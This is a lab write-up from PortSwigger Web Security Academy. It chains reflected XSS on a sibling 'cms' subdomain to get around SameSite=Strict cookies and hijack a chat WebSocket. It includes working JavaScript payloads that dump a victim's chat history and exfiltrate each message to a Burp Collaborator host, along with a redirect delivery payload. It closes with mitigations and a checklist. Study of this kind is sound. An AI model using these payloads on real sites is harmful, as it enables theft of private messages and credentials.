# Lab09 - SameSite Strict Bypass via Sibling Domain (CSWSH)

## Objective

Exploit a Cross-Site WebSocket Hijacking (CSWSH) vulnerability despite the application using:

```http
SameSite=Strict
```

session cookies.

The goal is to steal the victim's chat history and recover their credentials.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | CSRF / WebSocket Security |
| Difficulty | Practitioner |
| Vulnerability | CSWSH |
| Bypass Technique | SameSite Strict Bypass via Vulnerable Sibling Domain |
| Platform | PortSwigger Web Security Academy |

---

# Lab Description

The application contains a live chat feature using WebSockets.

The WebSocket handshake lacks CSRF protection.

Normally this would be exploitable through:

```text
Cross-Site WebSocket Hijacking (CSWSH)
```

However, the application uses:

```http
SameSite=Strict
```

which prevents authenticated cookies from being sent during cross-site requests.

To solve the lab, we must find a way to generate a:

```text
Same-Site Request
```

instead of a:

```text
Cross-Site Request
```

---

# Core Concept

## Same-Origin vs Same-Site

### Same-Origin

Must match:

```text
Scheme
Host
Port
```

Example:

```text
https://app.example.com
https://admin.example.com
```

Result:

```text
Same-Origin ❌
```

---

### Same-Site

Must match:

```text
Registrable Domain
```

Example:

```text
cms.example.com
target.example.com
```

Result:

```text
Same-Site ✅
```

---

# Why Normal CSWSH Fails

Attack from:

```text
attacker.net
```

to:

```text
wss://target.example.com/chat
```

Browser sees:

```text
Cross-Site
```

and therefore:

```text
SameSite=Strict
        ↓
Cookie Blocked
```

Result:

```text
Anonymous Session
No Chat History
Attack Fails
```

---

# Vulnerability Chain

```text
Missing CSRF Protection On WebSocket Handshake
        +
SameSite Strict Cookie
        +
Sibling Domain Discovery
        +
Reflected XSS On Sibling Domain
        =
Authenticated CSWSH
```

---

# Attack Flow

```text
Exploit Server
        ↓
Redirect Victim
        ↓
Sibling Domain XSS
        ↓
JavaScript Executes On Same-Site Domain
        ↓
Open WebSocket To Target
        ↓
Cookie Included
        ↓
READY Sent
        ↓
Server Dumps Chat History
        ↓
Messages Sent To Collaborator
        ↓
Credentials Stolen
```

---

# Reconnaissance Phase

## Step 1 - Analyze WebSocket Functionality

Open chat.

Send messages.

Inspect Burp:

```text
Proxy
    ↓
WebSocket History
```

Observed:

```text
Client Sends:
READY
```

Server Response:

```text
Entire Chat History
```

---

## Step 2 - Inspect Handshake

Captured:

```http
GET /chat HTTP/1.1
Upgrade: websocket
```

Observations:

```text
No CSRF Token
No Nonce
No Unpredictable Parameter
```

Potential CSWSH.

---

## Step 3 - Check Cookie

Observed:

```http
Set-Cookie:
session=XYZ;
SameSite=Strict
```

Important observation:

```text
Direct CSWSH Will Fail
```

because cookies won't be sent cross-site.

---

## Step 4 - Search For Sibling Domains

Inspected:

```text
JavaScript
Images
CSS
CORS Headers
```

Found:

```http
Access-Control-Allow-Origin:
https://cms-LABID.web-security-academy.net
```

This leaked a sibling domain.

---

## Step 5 - Test Sibling Domain

Visited:

```text
https://cms-LABID.web-security-academy.net
```

Found login page.

---

## Step 6 - Search For XSS

Submitted:

```html
<script>alert(1)</script>
```

inside username field.

Observation:

```text
Username Reflected
Alert Executed
```

Reflected XSS confirmed.

---

# Full Payload(s) Used

## Payload 1 - Basic CSWSH (Failed)

Purpose:

```text
Confirm Vulnerability Exists
```

```html
<script>
var ws = new WebSocket(
'wss://LABID.web-security-academy.net/chat'
);

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    fetch(
    'https://COLLABORATOR.oastify.com',
    {
        method:'POST',
        mode:'no-cors',
        body:event.data
    });
};
</script>
```

---

### Result

Collaborator received requests.

However:

```text
No Session Cookie
```

was present in WebSocket handshake.

Therefore:

```text
New Anonymous Session Created
```

Chat history empty.

Attack failed.

---

## Payload 2 - Inner CSWSH Payload (Successful)

```javascript
var ws = new WebSocket(
'wss://LABID.web-security-academy.net/chat'
);

ws.onopen = function() {
    ws.send("READY");
};

ws.onmessage = function(event) {
    fetch(
    'https://COLLABORATOR.oastify.com',
    {
        method:'POST',
        mode:'no-cors',
        body:event.data
    });
};
```

---

## Payload 3 - Final Delivery Payload

After URL encoding Payload 2:

```html
<script>
document.location =
"https://cms-LABID.web-security-academy.net/login?username=URL_ENCODED_INNER_SCRIPT&password=anything";
</script>
```

---

# Why The Payload Works

## Stage 1

Victim visits:

```text
Exploit Server
```

---

## Stage 2

Victim redirected to:

```text
cms-LABID.web-security-academy.net
```

---

## Stage 3

Reflected XSS executes.

JavaScript now runs inside:

```text
cms-LABID.web-security-academy.net
```

context.

---

## Stage 4

JavaScript opens:

```javascript
new WebSocket(
'wss://LABID.web-security-academy.net/chat'
)
```

Browser evaluates:

```text
cms-LABID
        ↓
LABID

Same-Site ✅
```

---

## Stage 5

Because request is:

```text
Same-Site
```

browser includes:

```text
Victim Session Cookie
```

---

## Stage 6

```javascript
ws.send("READY")
```

triggers:

```text
Chat History Dump
```

---

## Stage 7

Every chat message:

```javascript
fetch(
'https://COLLABORATOR.oastify.com'
)
```

is exfiltrated.

---

# Personal Analysis & Testing Process

## Initial Thought

My first assumption:

```text
Missing CSRF Protection
        ↓
Direct CSWSH
```

would solve the lab.

---

## First Failure

Used Payload 1.

Collaborator interactions appeared.

However:

```text
No Useful Chat Data
```

was received.

---

## Investigation

Checked:

```text
WebSocket Handshake
```

inside Burp.

Observed:

```http
SameSite=Strict
```

session cookie.

Realized:

```text
Cookie Not Being Sent
```

from attacker domain.

---

## New Hypothesis

Need:

```text
Same-Site Context
```

instead of:

```text
Cross-Site Context
```

---

## Sibling Domain Discovery

While reviewing responses:

```http
Access-Control-Allow-Origin
```

revealed:

```text
cms-LABID.web-security-academy.net
```

---

## XSS Discovery

Test:

```html
<script>alert(1)</script>
```

executed successfully.

Now attacker-controlled JavaScript could run from:

```text
Same-Site Domain
```

---

## Breakthrough

Realization:

```text
SameSite Uses Site
NOT Origin
```

Therefore:

```text
cms-LABID
        ↓
LABID
```

would send cookies.

---

## Final Verification

Checked WebSocket handshake again.

Observed:

```text
Victim Session Cookie Present ✅
```

Chat history immediately returned.

---

# Collaborator Notes

Important observations:

```text
Poll Now Required
```

Collaborator does not auto-refresh.

---

Read:

```text
Request Tab
```

not Response tab.

---

All exfiltrated chat messages appear as:

```text
Separate HTTP Interactions
```

---

# Tools Used

```text
Burp Proxy
Burp Repeater
Burp Collaborator
Burp Decoder
WebSocket History
```

---

# Mitigation

## Protect WebSocket Handshakes

Require:

```text
CSRF Tokens
```

or

```text
Origin Validation
```

during handshake.

---

## Fix XSS

Eliminate reflected XSS on sibling domains.

---

## Treat Sibling Domains As Untrusted

Do not assume:

```text
Same-Site
=
Trusted
```

---

# Real World Pentest Checklist

```text
[ ] Check WebSocket handshakes for CSRF protection
[ ] Check SameSite cookie settings
[ ] Enumerate sibling domains
[ ] Check CORS headers
[ ] Test every subdomain for XSS
[ ] Attempt CSWSH
[ ] Validate Origin header handling
```

---

# Key Learnings

- CSWSH is essentially CSRF for WebSockets.
- SameSite=Strict does not protect against same-site attacks.
- Vulnerable sibling domains can completely bypass SameSite protections.
- CORS headers often leak useful subdomains.
- One XSS on a sibling domain can compromise the entire site.

> SameSite=Strict is not a complete CSRF defense if any sibling domain allows attacker-controlled JavaScript execution.